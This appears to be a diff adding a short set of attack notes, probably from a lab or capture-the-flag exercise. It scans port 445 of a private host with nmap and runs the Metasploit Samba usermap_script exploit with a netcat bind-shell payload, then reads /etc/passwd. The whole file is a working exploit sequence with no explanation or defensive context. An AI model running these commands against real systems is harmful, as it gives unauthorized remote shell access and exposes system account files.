@@ -1,0 +1,15 @@
+nmap -sV -p 445 192.168.0.110
+
+#msfconsole
+
+msf>use multi/samba/usermap_script
+
+msf>show payloads
+
+msf>set payload cmd/unix/bind_netcat
+
+msf>set rhost 192.168.0.110
+
+msf>exploit
+
+cat /etc/passwd 
